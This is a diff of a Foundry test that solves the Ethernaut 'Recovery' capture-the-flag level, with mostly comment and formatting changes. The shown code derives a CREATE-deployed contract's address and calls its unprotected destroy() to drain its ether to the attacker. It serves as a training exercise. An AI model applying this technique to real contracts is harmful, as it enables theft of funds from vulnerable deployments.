@@ -6,7 +6,6 @@ import "forge-std/console.sol";
 import "../src/Recovery/RecoveryFactory.sol";
 import "../src/Ethernaut.sol";
 
-// forge test --match-contract RecoveryTest -vvvv
 contract RecoveryTest is Test {
     Ethernaut ethernaut;
     address player = address(100);
@@ -14,7 +13,7 @@ contract RecoveryTest is Test {
     function setUp() public {
         // create new instance of ethernaut
         ethernaut = new Ethernaut();
-        vm.deal(player, 5 ether); // give our address 5 ether
+        vm.deal(player, 5 ether); // give our player 5 ether
     }
 
     function testRecoveryHack() public {
@@ -33,13 +32,13 @@ contract RecoveryTest is Test {
          *************** */
 
         /*
-        * For this level we will need to play around with EVM OPCODE
-        * We need to really understand the contract and what's happening with new SimpleToken(_name, msg.sender, _initialSupply);
-        * It actually create OPCODE; new keyword uses the CREATE
-        * So there is a way to find the address of this created contract with opcode
-        * Once we have found it, it's quite straightforwad to call destroy method available
-        *  on simpleToken and which is not protected :)
-        */
+         * For this level we will need to play around with EVM OPCODE
+         * We need to really understand the contract and what's happening with new SimpleToken(_name, msg.sender, _initialSupply);
+         * It actually create OPCODE; new keyword uses the CREATE
+         * So there is a way to find the address of this created contract with opcode
+         * Once we have found it, it's quite straightforwad to call destroy method available
+         *  on simpleToken and which is not protected :)
+         */
         address addressToFind = address(
             uint160(
                 uint256(
@@ -59,8 +58,8 @@ contract RecoveryTest is Test {
         assertEq(balanceBefore, 0.001 ether);
         uint256 playerBalanceBefore = player.balance;
         /*
-        * not using the new keywoard for SimpleToken as we point to an existing contract
-        */
+         * not using the new keywoard for SimpleToken as we point to an existing contract
+         */
         SimpleToken(payable(addressToFind)).destroy(payable(player));
         uint256 balanceAfter = addressToFind.balance;
         assertEq(balanceAfter, 0);
